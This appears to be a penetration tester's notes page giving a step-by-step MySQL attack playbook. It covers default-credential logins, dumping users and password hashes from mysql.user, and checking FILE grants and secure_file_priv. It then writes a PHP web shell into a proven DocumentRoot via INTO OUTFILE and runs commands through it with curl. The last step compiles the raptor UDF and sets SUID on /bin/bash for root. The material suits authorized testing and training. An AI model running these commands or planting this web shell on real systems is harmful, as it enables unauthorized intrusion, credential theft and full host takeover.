## Goal
Login -> loot databases -> check grants -> test file read/write -> execute only when the web mapping is proven. UDF gives root only if mysqld runs as root.

**Checklist**
- [ ] creds/default login works?
- [ ] interesting databases checked?
- [ ] `CURRENT_USER()` / `USER()` and grants checked?
- [ ] `FILE` present?
- [ ] `secure_file_priv`, `@@basedir`, and `@@datadir` checked?
- [ ] file read/write works with OS permissions?
- [ ] web server present and `DocumentRoot` proven?
- [ ] virtual host or `Alias` mapping accounted for?
- [ ] harmless marker served before executable content?
- [ ] command execution confirmed, or stop at the file primitive?
- [ ] mysqld running as root -> UDF (local privesc)?

# Commands

### Step 1: Connect
```bash
mysql -h $IP -u root -p                 # try BLANK password first (just press Enter)
mysql -h $IP -u root -proot
mysql -h $IP -u root --skip-ssl -p      # if TLS handshake errors
mysql -h $IP -u <dbuser> -p'<dbpass>'   # reuse web creds (wp-config/.env DB_USER/DB_PASSWORD)
nmap -p3306 -sC -sV $IP
```

### Step 2: Loot
```sql
show databases; use <db>; show tables; select * from users;
select user,authentication_string from mysql.user;   -- password hashes
select @@version;
```

### Step 3: Check grants and file restrictions
phpMyAdmin's authenticated SQL console is MySQL access, not SQL injection.

```sql
SELECT CURRENT_USER(), USER(), @@version, @@version_compile_os;
SHOW GRANTS FOR CURRENT_USER();
SELECT @@global.secure_file_priv, @@basedir, @@datadir;
```

- `CURRENT_USER()` = effective privilege account; `USER()` = presented login.
- `FILE` must appear in the effective account's grants.
- `secure_file_priv`: `NULL` -> file import/export disabled; empty -> no MySQL directory restriction, but still need `FILE` + OS permissions; path -> file operations restricted there.
- `INTO OUTFILE` creates a server-side file and never overwrites. Use a new filename.

### Step 4: Test file read
Use only a path supported by evidence. `LOAD_FILE()` still needs `FILE`, an allowed path, and OS read permission.

```sql
SELECT LOAD_FILE('<evidence_supported_path>');
```

`NULL` -> wrong/unreadable path, missing `FILE`, or `secure_file_priv` blocked it.

### Step 5: Prove the webroot mapping
Only pursue web execution when a web server is present. Do not guess `C:\xampp\htdocs`, `/var/www/html`, or another common path. Read the observed Apache config and its includes; match `DocumentRoot`, virtual host, port, URL path, and any `Alias`.

Apache on Windows, with a shell:

```powershell
Get-CimInstance Win32_Service |
  Where-Object { $_.Name -match 'apache|httpd' -or $_.PathName -match 'apache|httpd' } |
  Select-Object Name,State,StartName,PathName

Get-CimInstance Win32_Process |
  Where-Object { $_.Name -match '^(httpd|apache).*\.exe$' } |
  Select-Object Name,ProcessId,ExecutablePath,CommandLine

# Honor observed -f/-d arguments. Otherwise recover the compiled config path:
& '<observed_httpd_executable>' -V
Select-String -Path '<observed_httpd_config>' -Pattern '^\s*(ServerRoot|DocumentRoot|Include|IncludeOptional|Alias)\b|^\s*<VirtualHost\b'
```

Use [[01_orientation]] / [[03_services]] for process and service details. With only database access, use application disclosures, errors, and evidence-supported `LOAD_FILE()` paths. No config/path evidence -> stop at the file primitive.

### Step 6: Marker -> URL -> execution
Write a harmless marker to the proven `DocumentRoot`. The destination must not already exist.

```sql
SELECT '<unique_marker>' INTO OUTFILE '<proven_document_root>/<unique_filename>.txt';
```

Request the exact scheme, host, port, and URL path from the applicable configuration:

```bash
curl -i 'http://<target>:<port>/<unique_filename>.txt'
curl -i -H 'Host: <vhost>' 'http://<target>:<port>/<unique_filename>.txt'
```

Exact marker returned -> the filesystem-to-URL mapping is proven. Only then write executable content:

```sql
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '<proven_document_root>/<unique_filename>.php';
```

```bash
curl -G --data-urlencode 'c=<identity_command>' 'http://<target>:<port>/<unique_filename>.php'
curl -G -H 'Host: <vhost>' --data-urlencode 'c=<identity_command>' 'http://<target>:<port>/<unique_filename>.php'
```

Use `whoami` (Windows) or `id` (Linux).

- access denied / `secure_file_priv` / OS error -> fix that gate first;
- destination exists -> choose a new filename;
- SQL write + HTTP 404/wrong content -> mapping, vhost, port, or `Alias` is wrong. Do not write executable content;
- marker served but PHP returned as text -> no code execution here;
- identity output -> route shell delivery and cleanup to [[00_FOOTHOLD]].

A SQL write proves only a file write. The served marker proves the URL mapping. Identity output proves command execution.

### Step 7: UDF root (mysqld runs as root, local privesc)
```bash
ps aux | grep mysqld                    # USER=root -> UDF gives root
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.c -lc
# create function do_system from the .so, run: chmod +s /bin/bash
```
